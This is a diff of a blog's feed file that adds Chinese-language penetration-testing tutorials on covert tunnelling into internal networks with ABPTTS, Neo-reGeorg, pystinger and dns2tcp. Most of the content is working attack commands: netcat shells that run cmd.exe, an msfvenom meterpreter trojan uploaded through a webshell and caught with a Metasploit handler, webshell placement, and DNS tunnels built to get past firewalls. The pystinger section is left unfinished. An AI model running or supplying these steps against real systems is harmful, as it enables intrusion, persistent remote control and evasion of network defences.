@@ -4,18 +4,81 @@
   
     
     <entry>
-      <title>DNS隧道搭建</title>
-      <link href="/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/"/>
-      <url>/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</url>
+      <title>http隧道:abptts端口映射</title>
+      <link href="/2022/08/09/http%E9%9A%A7%E9%81%93-abptts%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"/>
+      <url>/2022/08/09/http%E9%9A%A7%E9%81%93-abptts%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</url>
+      
+        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>abptts正向连接cs：<a href="http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-6">http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-6</a></p><p>abptts建立正向隧道：<a href="https://www.freebuf.com/sectool/259855.html">https://www.freebuf.com/sectool/259855.html</a></p><p>通过CrossC2上线linux：<a href="https://www.freebuf.com/sectool/334569.html">https://www.freebuf.com/sectool/334569.html</a></p><p>带profile上线linux：<a href="http://www.4k8k.xyz/article/w1590191166/119490557">http://www.4k8k.xyz/article/w1590191166/119490557</a></p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>工具下载</strong></p><p><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p><p>abptts可以实现端口对端口映射，且具有全加密对抗检测和稳定的优点，但目前只支持aspx和jsp两种脚本文件</p><p>下载后需要安装python2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycrypto</span><br><span class="line">pip install httplib2</span><br></pre></td></tr></table></figure><p><strong>搭建隧道</strong></p><p>生成服务端，目录下会出现server目录，目录内有不同环境的默认服务端文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python abpttsfactory.py -o server</span><br></pre></td></tr></table></figure><p>选择与目标对应环境的服务端上传，访问页面，结果如下图代表服务端运行正常</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091438399.png" alt="image-20220809143854159"></p><p>vps执行命令，搭建http隧道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 abpttsclient.py -c server/config.txt -u http://192.168.240.106:81/abptts.jsp -f 127.0.0.1:20011/127.0.0.1:20022</span><br></pre></td></tr></table></figure><p>-c 配置文件，生成服务端时一起生成的，在server目录下面</p><p>-u 上传的server文件链接</p><p>-f 将靶机的20022端口映射到vps的20011端口</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091446899.png" alt="image-20220809144652558"></p><p>现在vps的20011端口就相当于靶机的20022端口，20022端口有什么服务，我们都可以通过访问vps的20011端口访问到</p><p>比如在靶机20022端口开启nc监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvp 20022 -e cmd.exe</span><br></pre></td></tr></table></figure><p>vps本机nc本地20011端口，由于该端口接受了靶机20022端口的映射，因此nc本地等同于nc靶机的20022端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 20011</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091501336.png" alt="image-20220809150140696"></p><p>如果搭建隧道时，改为监听所有地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x python2 abpttsclient.py -c server/config.txt -u http://192.168.240.106:81/abptts.jsp -f 0.0.0.0:20011/127.0.0.1:20022</span><br></pre></td></tr></table></figure><p>那么其他主机也可以通过nc VPS的20011端口，去连接靶机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.240.54 20011</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091506718.png" alt="image-20220809150610784"></p><p><strong>利用隧道正向上线msf</strong></p><p>abptts命令不变，仍然是把靶机的20022映射到VPS的20011</p><p>msf生成木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp rhost=127.0.0.1 lport=20022 -f exe -o meterpreter.exe</span><br></pre></td></tr></table></figure><p>这里使用bind_tcp模块，如上命令生成的木马，在目标主机执行后，会监听本地的20022端口，等待msf正向连接</p><p>-f 指定木马类型</p><p>-o 指定木马文件名</p><p>把木马通过webshell上传到靶机并执行</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208130005428.png" alt="image-20220813000533284"></p><p>msf正向连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"># payload要与生成木马时所有payload一致</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lport 20011</span><br><span class="line">set rhost 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>msf上线成功</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208130008617.png" alt="image-20220813000759535"></p><p><strong>利用隧道正向上线cs</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 1.内网渗透 </category>
+          
+          <category> 1.内网穿透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>http隧道:neo-reGeorg</title>
+      <link href="/2022/08/07/http%E9%9A%A7%E9%81%93-neo-reGeorg/"/>
+      <url>/2022/08/07/http%E9%9A%A7%E9%81%93-neo-reGeorg/</url>
+      
+        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>使用方法很简单，看Usage即可</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>下载neo-reGeorg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/L-codes/Neo-reGeorg.git</span><br></pre></td></tr></table></figure><p>生成服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure><p>连接服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure><p>-l 本地监听地址</p><p>-p 本地监听端口</p><p>socks5代理搭建完毕</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPS地址:60000</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 1.内网渗透 </category>
+          
+          <category> 1.内网穿透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>http隧道:毒刺pystinger</title>
+      <link href="/2022/08/06/http%E9%9A%A7%E9%81%93-%E6%AF%92%E5%88%BApystinger/"/>
+      <url>/2022/08/06/http%E9%9A%A7%E9%81%93-%E6%AF%92%E5%88%BApystinger/</url>
+      
+        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-4">http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-4</a></p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>工具下载</strong></p><p><a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p><p>从release中下载最近版本，工具主要分为3部分</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208062042631.png" alt="image-20220806204255561"></p><p>webshell</p><p>包含.aspx .jsp .jspx .php四种webshell文件</p><p>将与网站环境对应的webshell，上传至网站根目录下即可，访问目标显示为UTF-8即代表正常连接。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208062047787.png" alt="image-20220806204746841"></p><p>服务端（被控端）</p><p>stinger_server.exe</p><p>同样上传到目标网站根目录，然后通过虚拟终端执行执行，命令为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 不能直接stinger_server.exe，会中断tcp连接</span><br><span class="line">start stinger_server.exe 0.0.0.0</span><br></pre></td></tr></table></figure><p>balabalabalabala以后再写。。。。。。。。。。。。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 1.内网渗透 </category>
+          
+          <category> 1.内网穿透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dns隧道:dns2tcp</title>
+      <link href="/2022/08/06/dns%E9%9A%A7%E9%81%93-dns2tcp/"/>
+      <url>/2022/08/06/dns%E9%9A%A7%E9%81%93-dns2tcp/</url>
       
         <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://developer.aliyun.com/article/394756">https://developer.aliyun.com/article/394756</a></p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>购买域名</strong></p><p>购买一个域名，这里以腾讯云域名作为示范</p><p><a href="https://buy.cloud.tencent.com/domain?from=console">https://buy.cloud.tencent.com/domain?from=console</a></p><p>买一个.com大概50、60块，一个.work,.xyz等冷门域名，10几块就可以了。</p><p><strong>环境准备</strong></p><p>下载dns2tcp到云服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/alex-sector/dns2tcp</span><br></pre></td></tr></table></figure><p>下载好后编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd dns2tcp</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>windows编译dns2tcp</p><p>在对某些windows主机为目标进行渗透时，需要用.exe格式的dns2tcpc.exe客户端</p><p>这一步暂未复现，参考网上一些教程失败了，先搁置，网上找了现成exe文件下载下来用，不放出链接，自行找资源，测毒。</p><p>经过如上步骤后，云服务器上编译好的dns2tcp应该可以使用dns2tcpd命令，这是服务端</p><p>windows上，把网上下载好的dns2tcpc.exe上传到靶机</p><p><strong>配置域名解析</strong></p><p>腾讯云使用的是DNSpod控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ns1.xxxxxx.com A 127.0.0.1 #添加一个A记录，ns1是A记录的名字，xxxxxx.com是你注册的域名，127.0.0.1是你的云服务器地址</span><br><span class="line">x1.xxxxxx.com NS ns1.xxxxxx.com #添加一个NS记录，x1是NS记录的名字，xxxxxx.com是你注册的域名，ns1.xxxxxx.com是A记录域名本身</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 概念解释</span><br><span class="line">A记录：域名指向IP</span><br><span class="line">NS记录：域名指向域名</span><br><span class="line"># 参考链接（这里解释的很清楚）：https://www.alibabacloud.com/help/zh/alidns-intl/latest/record-types</span><br></pre></td></tr></table></figure><p>大概是这样的：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208061628715.png" alt="image-20220806162845489"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最终是：</span><br><span class="line">x1.xxxxxx.com指向ns1.xxxxxx.com</span><br><span class="line">ns1.xxxxxx.com指向 云服务器IP</span><br></pre></td></tr></table></figure><p>云服务器53端口记得在防火墙上开放</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208061646691.png" alt="image-20220806164628817"></p><p><strong>工具使用</strong></p><p>写配置文件，一般是写在&#x2F;etc&#x2F;dns2tcp.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listen = 0.0.0.0</span><br><span class="line">port = 53</span><br><span class="line">user = root</span><br><span class="line">key = password</span><br><span class="line">chroot = /tmp/</span><br><span class="line">domain = x1.cethiik.com</span><br><span class="line">resources = ssh:127.0.0.1:22,socks:127.0.0.1:1088,other:127.0.0.1:7891,msf:127.0.0.1:7899,nc:127.0.0.1:4444</span><br></pre></td></tr></table></figure><p>listen为监听地址，一般为所有</p><p>Port为监听端口</p><p>user为用户，暂时没用到，随便写</p><p>key是连接密码，可以为空，客户连接时认证用</p><p>chroot暂时没用到</p><p>domain写ns记录的名字，本文中即：x1.xxxxxx.com</p><p>resources写你要开的服务，所使用服务必须在这里注册，客户端连接时需要用到</p><p>服务端命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcp.conf -F -d 3</span><br></pre></td></tr></table></figure><p>客户端命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc.exe -r nc -z x1.xxxxxx.com 127.0.0.1 -l 9098 -d 2</span><br></pre></td></tr></table></figure><p>-r 是指定服务，即在服务端配置文件resources中注册过的服务名字</p><p>-z 是指定NS记录名字</p><p>127.0.0.1是云服务器IP</p><p>-l 是指将指定服务绑定到本地哪个端口，随便写没被占用的即可</p><p>-d 是开启debug</p><p><strong>实例</strong></p><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcp.conf -F -d 3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc.exe -r nc -z x1.xxxxxx.com 127.0.0.1 -l 9098 -d 2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe 127.0.0.1 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
           
-          <category> 1.内网横向 </category>
+          <category> 1.内网渗透 </category>
           
-          <category> 1.流量代理 </category>
+          <category> 1.内网穿透 </category>
           
       </categories>
       
